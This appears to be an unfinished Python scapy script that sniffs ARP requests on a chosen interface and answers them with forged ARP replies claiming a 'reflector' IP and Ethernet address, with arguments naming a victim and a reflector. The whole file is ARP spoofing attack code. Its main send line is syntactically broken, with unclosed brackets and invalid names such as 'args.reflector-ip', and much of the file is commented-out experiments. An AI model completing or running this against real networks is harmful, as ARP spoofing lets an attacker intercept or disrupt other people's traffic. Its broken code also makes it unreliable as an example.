
#!/usr/local/bin/python
import scapy.all
from scapy.all import *
import argparse

# Args
parser = argparse.ArgumentParser()
parser.add_argument('--interface')
parser.add_argument('--victim-ip')
parser.add_argument('--victim-ethernet')
parser.add_argument('--reflector-ip')
parser.add_argument('--reflector-ethernet')
args = parser.parse_args()

counter = 0
# construct packet
def construct_packet (packet):
   global counter
   counter += 1
   return 'Packet #{}: {} ==> {}'.format(counter, packet[0][1].src, packet[0][1].dst)

# monitor the arp requests
def arp_monitor (pkt):
   if pkt[ARP].op == 1:
      #return 'Request: {} is asking about {}'.format(pkt[ARP].psrc, pkt[ARP].pdst)
      return sendp(Ether(dst=pkt[ARP.hwsrc,
src=args.reflector-ip)/ARP(hwsrc=args.reflector-ethernet,pdst=pkt[ARP.psrc)
   if pkt[ARP].op == 2:
      return '*Response: {} has address {}'.format(pkt[ARP].hwsrc, pkt[ARP].psrc)

#arppkt = eval(pkts[0].command())
#arppkt[ARP].hwsrc = "args.reflector-ip"
#arppkt[ARP].pdst = "pkts[ARP].psrc"
#arppkt[Ether].dst = "pkts[ARP].hwsrc"

#sniff(filter='ip', count=0, prn=construct_packet)
sniff(count=0, filter='arp', prn=arp_monitor)

# send reply
#arppkt
#sendp(arppkt)

# reading ARP requests
#pkts = sniff(count=0,filter="arp")
#pkts.summary()
#pkts[0].show()

#print('Source ip: ', pkt[ARP].psrc, ' ', 'source ethernet: ', pkt[ARP].hwsrc, ' ', 'destination ip: ', ' ', 'pkt[ARP].pdst')
